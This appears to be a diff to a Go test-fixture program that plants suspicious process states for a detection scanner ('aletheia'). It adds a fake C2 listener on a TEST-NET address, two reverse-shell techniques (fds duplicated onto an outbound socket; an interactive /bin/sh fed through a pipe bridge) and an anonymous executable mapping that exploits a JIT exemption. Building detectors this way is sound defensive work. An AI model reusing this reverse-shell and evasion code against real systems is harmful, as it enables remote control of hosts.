@@ -10,6 +10,7 @@ package main
 
 import (
 	"fmt"
+	"net"
 	"os"
 	"syscall"
 	"time"
@@ -69,6 +70,22 @@ func mapDeArquivo(path string, prot int, apagar bool) []byte {
 	return b
 }
 
+// vivos impede o GC de fechar sockets e pipes que a técnica precisa manter
+// abertos enquanto a aletheia escaneia.
+var vivos []any
+
+// destinoC2 é TEST-NET-3: reservado para documentação, NUNCA roteado. A conexão
+// é local (o listener está no mesmo contêiner), então o peer é "público" pela
+// classificação sem que nada saia para a internet.
+const destinoC2 = "203.0.113.5:4444"
+
+func socketFD(c net.Conn) int {
+	f, err := c.(*net.TCPConn).File()
+	must(err, "file do socket")
+	vivos = append(vivos, c, f)
+	return int(f.Fd())
+}
+
 func main() {
 	if len(os.Args) < 2 {
 		fmt.Fprintln(os.Stderr, "uso: plant <tecnica>")
@@ -115,6 +132,53 @@ func main() {
 		manter = append(manter, b)
 	case "deleted-data": // deleted_mapping exige EXECUTÁVEL: segmento de dado apagado passa
 		manter = append(manter, mapDeArquivo("/tmp/.plantd.so", syscall.PROT_READ|syscall.PROT_WRITE, true))
+
+	case "jit-inject": // maps_exec_anon isenta JIT em diretório de sistema: o
+		// runner roda ISTO como /usr/bin/node, e a região sem rótulo é isenta.
+		b := mmapAnon(syscall.PROT_READ | syscall.PROT_WRITE)
+		must(syscall.Mprotect(b, syscall.PROT_READ|syscall.PROT_EXEC), "mprotect")
+		manter = append(manter, b)
+
+	case "listen": // sobe o C2 falso e segura as conexões aceitas ESTABELECIDAS
+		ln, err := net.Listen("tcp", destinoC2)
+		must(err, "listen "+destinoC2)
+		fmt.Printf("LISTEN em %s\n", destinoC2)
+		os.Stdout.Sync()
+		for {
+			c, err := ln.Accept()
+			if err != nil {
+				continue
+			}
+			vivos = append(vivos, c)
+		}
+
+	case "revshell-direct": // correlate.revshell: fd 0,1,2 no MESMO socket de saída
+		c, err := net.Dial("tcp", destinoC2)
+		must(err, "dial")
+		sfd := socketFD(c)
+		fmt.Printf("PLANT pid=%d tech=revshell-direct\n", os.Getpid())
+		os.Stdout.Sync()
+		syscall.Dup2(sfd, 0)
+		syscall.Dup2(sfd, 1)
+		syscall.Dup2(sfd, 2)
+
+	case "revshell-bridge": // correlate.revshell_bridge: shell lê de pipe, ponte
+		// (este processo) segura o outro lado do pipe e o socket de saída.
+		c, err := net.Dial("tcp", destinoC2)
+		must(err, "dial")
+		_ = socketFD(c) // a ponte (nós) segura o socket
+		r, w, err := os.Pipe()
+		must(err, "pipe")
+		vivos = append(vivos, w) // a ponte segura a ponta de ESCRITA
+		nul, _ := os.OpenFile(os.DevNull, os.O_RDWR, 0)
+		// o shell REAL: stdin = ponta de LEITURA do pipe, comm vira "sh".
+		shPid, err := syscall.ForkExec("/bin/sh", []string{"sh", "-i"}, &syscall.ProcAttr{
+			Files: []uintptr{r.Fd(), nul.Fd(), nul.Fd()},
+		})
+		must(err, "forkexec sh")
+		r.Close() // só o shell precisa da leitura
+		fmt.Printf("PLANT pid=%d tech=revshell-bridge\n", shPid)
+		os.Stdout.Sync()
 
 	default:
 		fmt.Fprintln(os.Stderr, "técnica desconhecida:", os.Args[1])
